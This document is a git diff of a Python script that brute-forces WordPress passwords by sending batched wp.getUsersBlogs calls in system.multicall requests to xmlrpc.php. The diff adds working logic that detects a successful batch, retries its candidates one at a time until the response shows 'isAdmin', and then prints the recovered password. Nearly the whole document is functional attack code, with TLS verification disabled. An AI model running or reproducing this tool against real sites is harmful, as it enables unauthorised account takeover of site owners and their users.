@@ -22,22 +22,22 @@ class Forcer:
         self.user = user
     
     def craft_req_body(self):
-        start = '''
+        self.start = '''
             <?xml version="1.0"?>
     <methodCall>
     <methodName>system.multicall</methodName>
     <params>
       <param><value><array><data>
       '''
-        end = '''
+        self.end = '''
     </data></array></value>
     </param>
     </params>
     </methodCall>
     '''
-        body = start
-        cnt = 1
-        with open(self.wordlist, "r") as list:
+        body = self.start
+        self.cnt = 1
+        with open(self.wordlist, "r", errors='replace') as list:
             lines = list.readlines()
             for p in lines:
                 body += f'''
@@ -56,35 +56,67 @@ class Forcer:
                   </member>
                   </struct></value>
                 '''
-                cnt += 1
-                # send requests by the thousand, modify this depending on servers power
-                if cnt % 1000 == 0 or p == lines[-1]:
-                    body += end
-                    print(Fore.BLUE)
-                    print(f"sending body: {body}")
-                    print(Style.RESET_ALL)
+                self.cnt += 1
+                # %ing by number of requests send at once, modify this depending on servers power
+                if self.cnt % 100 == 0 or p == lines[-1]:
+                    body += self.end
                     self.send_request(body)
-                    body = start
+                    body = self.start
         list.close()
     
            
     
     def send_request(self, body):
         req_url = self.url + "/xmlrpc.php"
-        headers = {'Content-Type': 'application/xml'}
-        multiple_attempts = requests.post(req_url, data=body, headers = headers, verify=False)
-        print(Fore.RED)
-        print(multiple_attempts.text)
-        print(Style.RESET_ALL)
-           
+        self.headers = {'Content-Type': 'application/xml'}
+        with requests.post(req_url, data=body, headers = self.headers, verify=False) as r:
+            if "Automatically populating" in r.text:
+                self.fetch_password()
+    
+    def fetch_password(self):
+        self.cnt -= 1
+        req_url = self.url + "/xmlrpc.php"
+        with open(self.wordlist, "r", errors='replace') as w:
+            p = w.readlines()
+            for i in range(self.cnt, self.cnt+100):
+                body = self.start
+                body += f'''
+                    <value><struct>
+                  <member>
+                	<name>methodName</name>
+                	<value><string>wp.getUsersBlogs</string></value>
+                  </member>
+                  <member>
+                	<name>params</name><value><array><data>
+                	<value><array><data>
+                	<value><string>{self.user}</string></value>
+                	<value><string>{p[i].strip()}</string></value>
+                	</data></array></value>
+                	</data></array></value>
+                  </member>
+                  </struct></value>
+                '''
+                body += self.end
+                with requests.post(req_url, data=body, headers = self.headers, verify=False) as r:
+                    if "isAdmin" in r.text:
+                        print(Fore.GREEN)
+                        print(f"[+] Password found: {p[i].strip()}")
+                        print(Style.RESET_ALL)
+                        quit()
+
+
     def test_valid(self):
         req_url = self.url + "/xmlrpc.php"
-        test = requests.post(req_url, {"a":"b"}, verify=False)
-        if test.status_code != 200:
-            print(Fore.YELLOW)
-            print(f"[!] Expected code 200, but got {test.status_code} instead! quitting...")
-            print(Style.RESET_ALL)
-            return 1
+        with requests.post(req_url, {"a":"b"}, verify=False) as test:
+            if test.status_code != 200:
+                print(Fore.YELLOW)
+                print(f"[!] Expected code 200, but got {test.status_code} instead! quitting...")
+                print(Style.RESET_ALL)
+                return 1
+            else:
+                print(Fore.GREEN)
+                print(f"[+] url is valid, starting to bruteforce {req_url}. This may take a while...")
+                print(Style.RESET_ALL)
 
 
 def args_to_class():
@@ -126,7 +158,6 @@ def main():
     if forcer.test_valid(): # check for the /xmlrpc.php path
         return 1
     forcer.craft_req_body() # start bruteforcing
-    # TODO: implement the password found logic
     
 if __name__ == "__main__":
     main()
